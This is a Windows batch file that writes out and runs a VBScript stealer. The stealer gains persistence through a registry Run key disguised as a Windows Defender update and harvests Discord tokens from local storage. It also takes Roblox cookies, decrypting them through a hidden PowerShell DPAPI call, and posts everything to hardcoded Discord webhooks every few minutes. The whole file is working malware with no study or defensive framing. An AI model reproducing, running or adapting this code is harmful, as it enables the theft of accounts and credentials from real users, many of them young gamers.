@echo off
set "VBS=%TEMP%\c.vbs"
> "%VBS%" (
echo Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun
echo Set sh = CreateObject^("WScript.Shell"^)
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo.
echo WH_LOGS   = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
echo WH_REGRAB = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
echo WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"
echo.
echo PC   = sh.ExpandEnvironmentStrings^("%COMPUTERNAME%"^)
echo USER = sh.ExpandEnvironmentStrings^("%USERNAME%"^)
echo isFirstRun = True
echo.
echo On Error Resume Next
echo Dim selfPath: selfPath = WScript.ScriptFullName
echo Dim tempPath: tempPath = sh.ExpandEnvironmentStrings^("%TEMP%"^) ^& "\wdu.vbs"
echo.
echo If LCase^(selfPath^) ^<^> LCase^(tempPath^) Then
echo     fso.CopyFile selfPath, tempPath, True
echo     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe //B """ ^& tempPath ^& """", "REG_SZ"
echo     SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " ^& PC ^& " / " ^& USER ^& """,""color"":65280}]}"
echo     Call GrabTokens
echo     sh.Run "wscript.exe //B """ ^& tempPath ^& """", 0, False
echo     WScript.Quit
echo End If
echo On Error Goto 0
echo.
echo lastCookie = ""
echo Do
echo     Call GrabRoblox
echo     isFirstRun = False
echo     WScript.Sleep 150000
echo Loop
echo.
echo Sub GrabRoblox^(^)
echo     cookiePath = FindCookiePath^(^)
echo     If Len^(cookiePath^) = 0 Then Exit Sub
echo     Dim raw: raw = ReadFile^(cookiePath^)
echo     If Len^(raw^) ^< 50 Then Exit Sub
echo     Dim cookie: cookie = ExtractCookie^(raw^)
echo     If Len^(cookie^) = 0 Then Exit Sub
echo     If cookie ^<^> lastCookie Then
echo         lastCookie = cookie
echo         Dim t: t = FormatDateTime^(Now, 3^)
echo         Dim destWH
echo         If isFirstRun Then destWH = WH_LOGS Else destWH = WH_REGRAB
echo         SendWebhook destWH, "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" ^& cookie ^& "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " ^& t ^& """}}]}"
echo     End If
echo End Sub
echo.
echo Sub GrabTokens^(^)
echo     Dim paths, i, file, content, matches, m
echo     paths = Array^( _
echo         sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\discord\Local Storage\leveldb", _
echo         sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\discordcanary\Local Storage\leveldb", _
echo         sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\discordptb\Local Storage\leveldb", _
echo         sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\Lightcord\Local Storage\leveldb" _
echo     ^)
echo     Dim regex: Set regex = New RegExp
echo     regex.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
echo     regex.Global = True
echo     For i = 0 To UBound^(paths^)
echo         If fso.FolderExists^(paths^(i^)^) Then
echo             For Each file In fso.GetFolder^(paths^(i^)^).Files
echo                 If LCase^(Right^(file.Name, 3^)^) = "ldb" Or LCase^(Right^(file.Name, 3^)^) = "log" Then
echo                     content = ReadFile^(file.Path^)
echo                     Set matches = regex.Execute^(content^)
echo                     For Each m In matches
echo                         SendWebhook WH_LOGS, "{""content"":""Discord Token Found (" ^& file.Name ^& "):\n" ^& m.Value ^& """}"
echo                     Next
echo                 End If
echo             Next
echo         End If
echo     Next
echo End Sub
echo.
echo Function FindCookiePath^(^)
echo     Dim paths, i, pk, folder, subf, uwp
echo     paths = Array^( _
echo         sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\LocalStorage\robloxcookies.dat", _
echo         sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\LocalStorage\RobloxCookies.dat", _
echo         sh.ExpandEnvironmentStrings^("%APPDATA%"^) ^& "\Roblox\LocalStorage\robloxcookies.dat", _
echo         sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Roblox\Cookies" _
echo     ^)
echo     FindCookiePath = ""
echo     For i = 0 To 3
echo         If fso.FileExists^(paths^(i^)^) Then 
echo             FindCookiePath = paths^(i^)
echo             Exit Function
echo         End If
echo     Next
echo     pk = sh.ExpandEnvironmentStrings^("%LOCALAPPDATA%"^) ^& "\Packages"
echo     If fso.FolderExists^(pk^) Then
echo         Set folder = fso.GetFolder^(pk^)
echo         For Each subf In folder.SubFolders
echo             If InStr^(UCase^(subf.Name^), "ROBLOX"^) ^> 0 Then
echo                 uwp = subf.Path ^& "\LocalState\RobloxCookies.dat"
echo                 If fso.FileExists^(uwp^) Then 
echo                     FindCookiePath = uwp
echo                     Exit Function
echo                 End If
echo             End If
echo         Next
echo     End If
echo End Function
echo.
echo Function ExtractCookie^(raw^)
echo     ExtractCookie = ""
echo     Dim m: m = InStr^(raw, "_|WARNING"^)
echo     If m ^> 0 Then
echo         ExtractCookie = Mid^(raw, m^)
echo         Dim semi: semi = InStr^(ExtractCookie, ";"^)
echo         If semi ^> 0 Then ExtractCookie = Left^(ExtractCookie, semi - 1^)
echo         Exit Function
echo     End If
echo     If InStr^(raw, "CookiesData"^) ^> 0 Then
echo         Dim sp2: sp2 = InStr^(raw, """CookiesData"""^)
echo         If sp2 ^> 0 Then
echo             Dim colon: colon = InStr^(sp2, raw, ":"^)
echo             Dim q1: q1 = InStr^(colon, raw, """"^)
echo             Dim q2: q2 = InStr^(q1 + 1, raw, """"^)
echo             If q2 ^> q1 Then
echo                 Dim b64: b64 = Mid^(raw, q1 + 1, q2 - q1 - 1^)
echo                 If Len^(b64^) ^> 100 Then
echo                     Dim dec: dec = DecryptDPAPI^(b64^)
echo                     If Len^(dec^) ^> 0 Then
echo                         Dim dm: dm = InStr^(dec, "_|WARNING"^)
echo                         If dm ^> 0 Then 
echo                             ExtractCookie = Mid^(dec, dm^)
echo                             Dim ds: ds = InStr^(ExtractCookie, ";"^)
echo                             If ds ^> 0 Then ExtractCookie = Left^(ExtractCookie, ds - 1^)
echo                         Else
echo                             ExtractCookie = dec
echo                         End If
echo                     End If
echo                 End If
echo             End If
echo         End If
echo     End If
echo End Function
echo.
echo Sub SendWebhook^(url, json^)
echo     Dim h: Set h = CreateObject^("MSXML2.ServerXMLHTTP.6.0"^)
echo     h.Open "POST", url, False
echo     h.SetRequestHeader "Content-Type", "application/json"
echo     h.Send json
echo End Sub
echo.
echo Function ReadFile^(path^)
echo     ReadFile = ""
echo     Dim f: Set f = fso.OpenTextFile^(path, 1^)
echo     ReadFile = f.ReadAll
echo     f.Close
echo End Function
echo.
echo Function DecryptDPAPI^(b64^)
echo     DecryptDPAPI = ""
echo     Dim inf: inf = sh.ExpandEnvironmentStrings^("%TEMP%"^) ^& "\dpi.txt"
echo     Dim outf: outf = sh.ExpandEnvironmentStrings^("%TEMP%"^) ^& "\dpo.txt"
echo     Dim f1: Set f1 = fso.CreateTextFile^(inf, True^)
echo     f1.Write b64
echo     f1.Close
echo     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" ^& inf ^& "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" ^& outf ^& "' -Encoding utf8}catch{''|Out-File '" ^& outf ^& "'}"
echo     Dim psf: psf = sh.ExpandEnvironmentStrings^("%TEMP%"^) ^& "\dp.ps1"
echo     Dim f2: Set f2 = fso.CreateTextFile^(psf, True^)
echo     f2.Write ps
echo     f2.Close
echo     sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ ^& psf ^& """", 0, True
echo     If fso.FileExists^(outf^) Then 
echo         Dim f3: Set f3 = fso.OpenTextFile^(outf, 1^)
echo         DecryptDPAPI = f3.ReadAll
echo         f3.Close
echo     End If
echo     fso.DeleteFile inf, True
echo     fso.DeleteFile psf, True
echo     fso.DeleteFile outf, True
echo End Function
)
cscript //nologo "%VBS%"
del "%VBS%"
